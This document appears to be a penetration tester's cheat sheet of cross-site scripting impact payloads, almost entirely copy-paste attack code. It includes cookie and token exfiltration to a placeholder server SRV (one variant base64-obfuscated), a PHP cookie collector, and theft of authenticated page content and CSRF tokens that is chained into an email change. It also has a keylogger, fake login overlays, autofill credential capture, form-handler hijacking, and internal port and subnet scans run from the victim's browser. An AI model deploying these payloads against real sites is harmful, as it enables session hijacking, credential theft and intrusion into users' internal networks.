# XSS impact PoCs — Open WHEN: JS execution is already proven and you need a copy-paste PoC that demonstrates concrete impact (token/cookie/page-content exfil, keylog, CSRF-token theft, internal port scan)

Body already covers: prefer fetch over image beacons, `localStorage`/`sessionStorage` token
read, CSRF chaining, service-worker persistence, credential-prompt overlay, port-scan
mention. Everything below is the runnable code for those, plus exfil variants.

## Replace `alert(1)` with scope-revealing proof first
```html
<script>console.log(document.domain.concat("\n").concat(window.origin))</script>
<script>debugger;</script>     // opens DevTools instead of a dialog (sandbox-domain check)
```
Use `console.log` not `alert` for stored XSS (no per-hit dialog to dismiss). Use
`alert(document.domain)`/`window.origin` not `alert(1)` to confirm which origin executed.

## Cookie / token exfil — many sink variants (rotate if one form is filtered)
```html
<script>new Image().src="http://SRV/?c="+document.cookie</script>
<script>new Audio().src="http://SRV/?c="+escape(document.cookie)</script>
<script>navigator.sendBeacon('https://SRV/x',document.cookie)</script>
<script>fetch('https://SRV',{method:'POST',mode:'no-cors',body:document.cookie})</script>
<script>var x=new XMLHttpRequest();x.open("GET","http://SRV/?c="+document.cookie,true);x.send()</script>
<script>location="https://SRV/?c=".concat(document.cookie)</script>
<script>document.location=["http://SRV/?c",document.cookie].join()</script>
<script>new Image().src="http://SRV/?c="+localStorage.getItem('access_token')</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'))</script>
```
`HttpOnly` blocks `document.cookie` — pivot to `localStorage`/`sessionStorage` tokens or to
same-origin CSRF-able actions (see CSRF-token theft below).

## Minimal collector + one-line listener (confirm a blind hit before deploying tooling)
```php
<?php $c=$_GET['c']; $fp=fopen('cookies.txt','a+'); fwrite($fp,'Cookie:'.$c."\r\n"); fclose($fp); ?>
```
```bash
ruby -run -ehttpd . -p8080          # serve the collector + receive hits
```

## Steal full authenticated page content (read response, exfil base64)
```javascript
var xhr=new XMLHttpRequest();
xhr.onreadystatechange=function(){ if(xhr.readyState==4){
  fetch("http://SRV/exfil?"+encodeURI(btoa(xhr.responseText))); } };
xhr.open("GET","http://TARGET/sensitive-page",true); xhr.send(null);
```

## Steal a CSRF token, then perform the protected action with it
```html
<script>
var req=new XMLHttpRequest(); req.onload=handle; req.open('get','/email',true); req.send();
function handle(){
  var token=this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  var c=new XMLHttpRequest(); c.open('post','/email/change-email',true);
  c.send('csrf='+token+'&email=test@test.com');
}
</script>
```

## Keylogger (one-line, self-removing image trigger)
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://SRV/?k="+String.fromCharCode(e.which))},this.remove();'>
```

## Fake login overlay (capture credentials) — full inline form
```html
<style>::placeholder{color:white}</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://SRV/'><p>Your session has timed out, please login again:</p><input style='width:100%' type='text' placeholder='Username'/><input style='width:100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form></div>")</script>
```
Replace the whole page with a login form and rewrite the URL to look legitimate:
```html
<script>history.replaceState(null,null,'../../../login');
document.body.innerHTML="<h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'><input value='submit' type='submit'></form>"</script>
```

## Capture browser-autofilled credentials (fires even if user types nothing)
```html
<b>Username:</b><br><input name=username id=username>
<b>Password:</b><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://SRV',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```
The browser auto-fills both fields; the `onchange` exfils on the autofill write.

## Hijack a form handler before it is declared (const shadowing)
If a later `function DoLogin(){...}` exists and your payload runs earlier, lock the name with
a `const` — later function declarations can't rebind a `const`:
```javascript
var s=document.createElement('script');
s.textContent="const DoLogin=()=>{const p=Trim(FormInput.InputPassword.value);const u=Trim(FormInput.InputUtente.value);fetch('https://SRV/?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p));}";
document.head.appendChild(s);
```
Note: `const`/`let` inside `eval()` are block-scoped and do NOT become globals — inject via a
real `<script>` element (as above) when you need a global, non-rebindable hook.

## Internal-network port scan from the victim's browser (fetch timing)
```javascript
const checkPort=(p)=>{fetch(`http://localhost:${p}`,{mode:"no-cors"}).then(()=>{let i=document.createElement("img");i.src=`http://SRV/ping?port=${p}`;});};
for(let i=0;i<1000;i++){checkPort(i);}
```
WebSocket timing variant (short time = port responds, long = no response):
```javascript
var ports=[80,443,445,3306,3690,1234];
for(var i=0;i<ports.length;i++){var s=new WebSocket("wss://192.168.1.1:"+ports[i]);s.start=performance.now();s.port=ports[i];
s.onerror=function(){console.log("Port "+this.port+": "+(performance.now()-this.start)+" ms");};
s.onopen=function(){console.log("Port "+this.port+": "+(performance.now()-this.start)+" ms");};}
```

## Sweep an internal /24 and exfil reachable hosts (threaded fetch)
```html
<script>
var q=[],SRV="http://SRV",wait=2000,n=51;
for(i=1;i<=255;i++){q.push((function(u){return function(){fetchUrl(u,wait)}})("http://192.168.0."+i+":8080"));}
for(i=1;i<=n;i++){if(q.length)q.shift()();}
function fetchUrl(u,w){var c=new AbortController();fetch(u,{signal:c.signal}).then(r=>r.text().then(t=>{location=SRV+"?ip="+u.replace(/^http:\/\//,'')+"&code="+encodeURIComponent(t)+"&"+Date.now()})).catch(e=>{if(!String(e).includes("aborted")&&q.length)q.shift()()});setTimeout(x=>{c.abort();if(q.length)q.shift()()},w);}
</script>
```

## Steal cross-window postMessage data (if target listens with `*`)
```html
<img src="https://SRV/?" id=m>
<script>window.onmessage=function(e){document.getElementById("m").src+="&"+e.data;}</script>
```

## Recover a value already cleared from JS (RegExp static leftovers)
After a regex `.test(secret)`, the input survives in `RegExp.input` / `RegExp.rightContext`
even if the variable was blanked:
```javascript
console.log(RegExp.input); console.log(RegExp.rightContext);
console.log(document.all["0"].ownerDocument.defaultView.RegExp.rightContext);
```

## Pivot XSS → SSRF via Edge-Side-Include (caching layer in front)
```
<esi:include src="http://SRV/capture" />
```
